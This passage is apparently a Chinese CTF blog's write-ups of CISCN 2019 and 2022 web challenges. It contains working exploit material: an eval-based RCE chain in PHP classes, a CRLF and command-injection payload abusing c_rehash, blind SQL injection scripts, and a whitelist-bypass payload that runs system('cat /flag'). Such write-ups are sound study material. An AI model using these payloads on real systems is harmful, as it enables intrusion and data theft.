class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>没有什么用，就是混淆视听的</p>
<p>ListView.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">ListView</span> <span class="keyword">extends</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tagName</span>=<span class="string">&#x27;div&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$template</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;renderContent();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;&quot;</span>.<span class="keyword">$this</span>-&gt;tagName.<span class="string">&quot;&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderContent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">echo</span> preg_replace_callback(<span class="string">&quot;/&#123;(\w+)&#125;/&quot;</span>,<span class="keyword">array</span>(<span class="keyword">$this</span>,<span class="string">&#x27;renderSection&#x27;</span>),<span class="keyword">$this</span>-&gt;template);</span><br><span class="line">        ob_end_flush();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">renderSection</span>(<span class="params"><span class="variable">$matches</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$method</span>=<span class="string">&#x27;render&#x27;</span>.<span class="variable">$matches</span>[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(method_exists(<span class="keyword">$this</span>,<span class="variable">$method</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$method</span>();</span><br><span class="line">            <span class="variable">$html</span>=ob_get_contents();</span><br><span class="line">            ob_clean();</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$html</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>是个抽象类有run方法并且继承了base类</p>
<p>base.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$getter</span> = <span class="string">&#x27;get&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$getter</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$getter</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;error property <span class="subst">&#123;$name&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$setter</span> = <span class="string">&#x27;set&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$setter</span>;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$setter</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$setter</span>(<span class="variable">$value</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;error property <span class="subst">&#123;$name&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$getter</span> = <span class="string">&#x27;get&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$getter</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$getter</span>() !== <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$setter</span> = <span class="string">&#x27;set&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">if</span> (method_exists(<span class="keyword">$this</span>, <span class="variable">$setter</span>))</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$setter</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evaluateExpression</span>(<span class="params"><span class="variable">$_expression_</span>,<span class="variable">$_data_</span>=<span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_string(<span class="variable">$_expression_</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            extract(<span class="variable">$_data_</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">eval</span>(<span class="string">&#x27;return &#x27;</span>.<span class="variable">$_expression_</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_data_</span>[]=<span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">return</span> call_user_func_array(<span class="variable">$_expression_</span>, <span class="variable">$_data_</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在evaluateExpression方法中可以rce。</p>
<p>TestView.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestView</span> <span class="keyword">extends</span> <span class="title">ListView</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> FILTER_POS_HEADER=<span class="string">&#x27;header&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER_POS_BODY=<span class="string">&#x27;body&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$columns</span>=<span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rowCssClass</span>=<span class="keyword">array</span>(<span class="string">&#x27;odd&#x27;</span>,<span class="string">&#x27;even&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rowCssClassExpression</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rowHtmlOptionsExpression</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$selectableRows</span>=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filterSelector</span>=<span class="string">&#x27;&#123;filter&#125;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filterCssClass</span>=<span class="string">&#x27;filters&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filterPosition</span>=<span class="string">&#x27;body&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filter</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hideHeader</span>=<span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableHeader</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;hideHeader)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;thead&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filterPosition===<span class="built_in">self</span>::FILTER_POS_HEADER)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderFilter();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filterPosition===<span class="built_in">self</span>::FILTER_POS_BODY)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderFilter();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/thead&gt;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="keyword">$this</span>-&gt;filter!==<span class="literal">null</span> &amp;&amp; (<span class="keyword">$this</span>-&gt;filterPosition===<span class="built_in">self</span>::FILTER_POS_HEADER || <span class="keyword">$this</span>-&gt;filterPosition===<span class="built_in">self</span>::FILTER_POS_BODY))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;thead&gt;\n&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;renderFilter();</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/thead&gt;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderFilter</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;filter!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;tr class=\&quot;<span class="subst">&#123;$this-&gt;filterCssClass&#125;</span>\&quot;&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableRow</span>(<span class="params"><span class="variable">$row</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$htmlOptions</span>=<span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">            <span class="variable">$options</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowHtmlOptionsExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$options</span>))</span><br><span class="line">                <span class="variable">$htmlOptions</span> = <span class="variable">$options</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;rowCssClassExpression!==<span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;dataProvider-&gt;data[<span class="variable">$row</span>];</span><br><span class="line">            <span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;evaluateExpression(<span class="keyword">$this</span>-&gt;rowCssClassExpression,<span class="keyword">array</span>(<span class="string">&#x27;row&#x27;</span>=&gt;<span class="variable">$row</span>,<span class="string">&#x27;data&#x27;</span>=&gt;<span class="variable">$data</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(is_array(<span class="keyword">$this</span>-&gt;rowCssClass) &amp;&amp; (<span class="variable">$n</span>=count(<span class="keyword">$this</span>-&gt;rowCssClass))&gt;<span class="number">0</span>)</span><br><span class="line">            <span class="variable">$class</span>=<span class="keyword">$this</span>-&gt;rowCssClass[<span class="variable">$row</span>%<span class="variable">$n</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$class</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]))</span><br><span class="line">                <span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>].=<span class="string">&#x27; &#x27;</span>.<span class="variable">$class</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="variable">$htmlOptions</span>[<span class="string">&#x27;class&#x27;</span>]=<span class="variable">$class</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">renderTableBody</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span>=<span class="keyword">$this</span>-&gt;data;</span><br><span class="line">        var_dump(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$n</span>=count(<span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;tbody&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$row</span>=<span class="number">0</span>;<span class="variable">$row</span>&lt;<span class="variable">$n</span>;++<span class="variable">$row</span>)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;renderTableRow(<span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;&lt;td colspan=&quot;&#x27;</span>.count(<span class="keyword">$this</span>-&gt;columns).<span class="string">&#x27;&quot; class=&quot;empty&quot;&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/tbody&gt;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>继承了listview抽象类，有run方法并且也调用了evaluateExpression，是我们可以利用的类。</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220511162818.png"></p>
<p>run方法中调用了rendercontent方法，我们跟进看看这个方法</p>
<p><img src="/.com//Users\rangaork\AppData\Roaming\Typora\typora-user-images\image-20220511163008412.png" alt="image-20220511163008412"></p>
<p>看到有一个preg_replace_callback函数，该函数会把匹配到的内容作为回调函数的参数，在这里回调函数是rendersection继续跟进</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220511163555.png"></p>
<p>该方法会把参数进行字符串拼接，在前端拼接上reander，并且会把拼接好的字符串当作函数调用，接下来就是找rander开头的函数有没有能利用的地方</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220511164309.png"></p>
<p>这个函数就满足我们的条件，render开头，调用了evaluateExpression并且参数可控，但是这个函数需要一个参数才能调用，而rendersection的调用是不带参数的,我们得早另一个方法去调用他</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220511165221.png"></p>
<p>调用这个方法就可以解决我们的问题</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220511170548.png"></p>
<p>成功rec</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220511170633.png"></p>
<p>读到flag</p>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2022/06/02/ciscn%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602160204.png"></p>
<p>go源码中的admin路由有文件重命名，</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602161114.png"></p>
<p>py源码中在createlink路由中会执行系统命令</p>
<p>c_rehash这个命令有一个cve</p>
<p>1.随便找一个pem文件，假设其路径为/tmp/test-cert.pem 2.将$fname参数设置为”/tmp/test-cert.pem”&amp;&amp;whoami&amp;&amp;echo” 最终的执行命令为：openssl x509 -subject_hash -fingerprint -noout -in “/tmp/test-cert.pem”&amp;&amp;whoami&amp;&amp;echo””</p>
<p>whoami就是我们要执行的命令，所以我们要把crt文件重命名来实现rce</p>
<p>能重命名的是go的网站但是没有对外网开放，我们只能通过py网站的proxy路由访问</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602180202.png"></p>
<p>我们先去get_crt路由创建一个crt文件用于改名</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602180936.png"></p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220602181158.png"></p>
<p>然后去proxy访问admin/rename</p>
<p>发现要先过个判断</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220603151857.png"></p>
<p>需要我们去更改http的请求头</p>
<p>但是</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220603152258.png"></p>
<p>flask这里已经给了请求头，所以我们要有换行符需要伪造请求头</p>
<p>payload</p>
<p>uri=/admin/renam%25%36%35?oldname=6271e5b3-a881-4ba2-8de1-d76517f1ec81.crt%26newname=1.crt%2522%257C%257Cecho%2520Y2F0IC9mbGFnID5jbm0udHh0%257Cbase64%2520-d%257Cbash%2526%2526echo%2522%20HTTP/1.1%0d%0aHost:%20admin%0d%0aConnection:close%0d%0a%0d%0a</p>
<h2 id="CISCN-2022-初赛-ezpop"><a href="#CISCN-2022-初赛-ezpop" class="headerlink" title="[CISCN 2022 初赛]ezpop"></a>[CISCN 2022 初赛]ezpop</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610191930.png"></p>
<p>thinkphp6反序列化，网上就有payload，用<a href="http://www.zip看源码,找对路由就行/">www.zip看源码，找对路由就行</a></p>
<h2 id="CISCN-2022-初赛-ezpentest"><a href="#CISCN-2022-初赛-ezpentest" class="headerlink" title="[CISCN 2022 初赛]ezpentest"></a>[CISCN 2022 初赛]ezpentest</h2><p>和虎符的题目很像就是多了一些过滤，大小写用utf8mb4_bin+collate来判断，但是原来的<del>0溢出用不了因为</del>被过滤了，要换成!0+18446744073709551615+1+’’，让整数溢出</p>
<p>regexp也被过滤了用不了，用%来代替</p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://1.14.71.254:28465/login.php&#x27;</span></span><br><span class="line">k=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">ascii</span> <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#123;&#125;!@$^&amp;._&#x27;&quot;</span>:</span><br><span class="line">        t=<span class="built_in">ascii</span></span><br><span class="line"></span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;xxx&#x27;</span>,</span><br><span class="line">            <span class="comment"># &quot;username&quot;:f&quot;&#x27;||case`username`like&#x27;&#123;flag+temp&#125;%&#x27;COLLATE&#x27;utf8mb4_bin&#x27;when&#x27;1&#x27;then!0+18446744073709551615+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;&quot;,</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;&#x27;||case`password`like&#x27;<span class="subst">&#123;k+t&#125;</span>%&#x27;COLLATE&#x27;utf8mb4_bin&#x27;when&#x27;1&#x27;then!0+18446744073709551615+1+&#x27;&#x27;else&#x27;0&#x27;end||&#x27;&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url=url, data=payload)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">500</span>:</span><br><span class="line">            k+=t</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220610201849.png"></p>
<p>但是登不上不知道怎么回事</p>
<h2 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h2><p>简单题,用sql的if盲注,空格被过滤用括号</p>
<p>payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1.14.71.254:28985/index.php&#x27;</span></span><br><span class="line">U = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">140</span>):</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;),1,0)&quot;</span>.<span class="built_in">format</span>(i, j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data)  <span class="comment"># 请求</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello, glzjin wants a girlfriend&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            U = U + <span class="built_in">chr</span>(j)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(U)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607141059.png">会显示ip和xff，我们尝试修改看看</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607141711.png">在这会显示</p>
<p>题目给了提示是smart的ssti，smarty是php的框架可以执行php命令</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607143403.png"></p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607142948.png"></p>
<p>拿到flag</p>
<h2 id="CISCN-2019初赛-Love-Math"><a href="#CISCN-2019初赛-Love-Math" class="headerlink" title="[CISCN 2019初赛]Love Math"></a>[CISCN 2019初赛]Love Math</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220607175341.png"></p>
<p>可以看到有给eval可以命令执行，但是过滤了很多函数，并且限制了长度，不能用无字母getshell。</p>
<p>php有一个特性，变量可以被当成函数使用</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608150540.png"></p>
<p>可以看到dir命令被执行了。</p>
<p>而本题目只对传入的c进行了过滤，我们只要把我们要执行的命令用别的参数传进去就行了，然后执行c去获取我们传进去的参数</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$_GET[a]($_GET[b])&amp;a=system&amp;b=cat /ls</span><br></pre></td></tr></table></figure>

<p>但是白名单里没有GET，我们看看白名单里有什么</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608151951.png"></p>
<p>一些数学函数，由数学我们就可想到asc码可以转换数字和字符串，我们看看白名单里有没有可以利用的函数</p>
<p>hex2bin()可以转换16进制成字符，但是16进制会带字母，会被过滤所以我们要用base_convert()把10进制转换成16进制</p>
<p>paylaod</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag</span><br></pre></td></tr></table></figure>



<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608153715.png"></p>
<p>拿到flag</p>
<h2 id="CISCN-2019华北Day1-Web1"><a href="#CISCN-2019华北Day1-Web1" class="headerlink" title="[CISCN 2019华北Day1]Web1"></a>[CISCN 2019华北Day1]Web1</h2><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154118.png"></p>
<p>先注册登入</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154204.png"></p>
<p>看到可以上传文件</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154534.png"></p>
<p>试下下载，burp抓包</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608154611.png"></p>
<p>看到dowload路由，并且post了我们要下的文件名，猜一手能读flag</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220608155007.png"></p>
<p>能读文件但是读不到flag，那就先读个源码把家人们</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link 